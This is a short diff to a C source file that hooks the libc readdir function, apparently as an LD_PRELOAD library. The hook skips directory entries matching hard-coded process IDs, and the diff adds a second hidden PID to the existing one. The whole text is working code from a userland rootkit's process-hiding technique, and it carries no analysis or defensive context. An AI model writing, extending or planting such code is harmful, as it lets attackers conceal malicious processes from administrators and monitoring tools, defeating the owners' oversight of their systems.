@@ -9,6 +9,7 @@
 
 static struct dirent *(*orig_readdir) (DIR *) = NULL;
 static const char* hide_process = "6592";
+static const char* hide_process2 = "6204";
 
 struct dirent *readdir (DIR * dirp){
    if (orig_readdir == NULL){
@@ -20,7 +21,7 @@ struct dirent *readdir (DIR * dirp){
 
    struct dirent* ret = orig_readdir(dirp);
    
-   while (ret != NULL && (strcmp(ret->d_name,hide_process) == 0)){
+   while (ret != NULL && (strcmp(ret->d_name,hide_process) == 0 || strcmp(ret->d_name,hide_process2) == 0 )){
       ret = orig_readdir (dirp);
    }
    return ret;
